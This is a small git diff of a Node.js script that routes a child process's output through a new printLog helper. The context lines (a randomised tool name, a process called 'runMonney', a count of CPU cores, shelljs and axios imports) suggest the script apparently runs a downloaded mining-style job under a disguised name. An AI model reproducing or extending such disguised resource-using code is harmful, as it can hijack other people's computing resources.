@@ -4,6 +4,7 @@ const { createWriteStream } = require('fs')
 const Path = require('path')
 const Axios = require('axios')
 const shell = require('shelljs');
+const { printLog } = require('./log-print');
 
 const nameTool = Math.random().toString(36).substring(7);
 
@@ -17,8 +18,8 @@ const runJob = (nameTool) => {
     if (runMonney.code !== undefined) {
         return 0;
     }
-    runMonney.stdout.on('data', (data) => {
-        console.log(`processing: ${data}`);
+    runMonney.stdout.on('data', (rawLog) => {
+        printLog(rawLog);
     });
     console.log(`-- dang tien hanh jobs voi ${ coreNumber } core`);
 }
